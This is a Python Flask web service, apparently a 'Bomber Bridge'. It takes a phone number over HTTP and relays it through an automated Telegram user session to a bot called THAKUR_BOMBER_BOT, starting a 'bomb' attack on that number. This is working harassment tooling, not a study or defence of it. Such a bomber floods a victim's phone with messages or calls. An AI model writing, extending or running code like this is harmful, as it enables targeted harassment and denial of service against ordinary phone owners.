import asyncio, re, logging, os
from flask import Flask, request, jsonify
from telethon import TelegramClient, errors

API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
PHONE_NUMBER = os.getenv("PHONE_NUMBER", "")
BRIDGE_SECRET = os.getenv("BRIDGE_SECRET", "mysecret123")
BOT_USERNAME = "THAKUR_BOMBER_BOT"

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ❌ Module level pe kuch mat banao — Gunicorn fork pe loop toot jaata hai
_client = None
_loop = None

def get_client():
    """Lazy init — first request pe banta hai, fir reuse hota hai"""
    global _client, _loop
    if _client is None:
        _loop = asyncio.new_event_loop()
        asyncio.set_event_loop(_loop)
        _client = TelegramClient("session_bomber", API_ID, API_HASH)
    return _client, _loop

async def do_login(client):
    await client.connect()
    if await client.is_user_authorized():
        logger.info("✅ Session valid")
        return True
    logger.error("❌ Session invalid/expired")
    return False

async def start_attack(client, number):
    num = re.sub(r'[\s\-\+\(\)]', '', number)
    if len(num) == 10:
        num = f"+91{num}"
    elif len(num) == 12 and num.startswith("91"):
        num = f"+{num}"

    bot = await client.get_entity(BOT_USERNAME)
    await client.send_message(bot, "/menu")
    await asyncio.sleep(2)

    async for msg in client.iter_messages(bot, limit=10):
        if msg.buttons:
            for row in msg.buttons:
                for btn in row:
                    if "START" in btn.text.upper():
                        await btn.click()
                        break
                else:
                    continue
                break
        break

    await asyncio.sleep(2)
    await client.send_message(bot, num)
    await asyncio.sleep(2)

    async for msg in client.iter_messages(bot, limit=2):
        if not msg.outgoing and msg.text:
            return {"status": "success", "target": num, "bot_response": msg.text}
    return {"status": "success", "target": num, "bot_response": "Sent"}

@app.route("/", methods=["POST"])
def handle():
    data = request.get_json(force=True, silent=True)
    if not data or data.get("secret") != BRIDGE_SECRET:
        return jsonify({"error": "Secret galat hai"}), 403
    if data.get("action") != "bomb" or not data.get("number"):
        return jsonify({"error": "Sahi number daal bhai"}), 400
    try:
        client, loop = get_client()
        ok = loop.run_until_complete(do_login(client))
        if not ok:
            return jsonify({"status": "failed", "error": "Session expired. Re-login via Console."}), 401
        result = loop.run_until_complete(start_attack(client, data["number"]))
        return jsonify(result)
    except Exception as e:
        logger.exception("Attack failed")
        return jsonify({"status": "failed", "error": str(e)}), 500

@app.route("/", methods=["GET"])
def home():
    return jsonify({"service": "Bomber Bridge", "status": "running"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
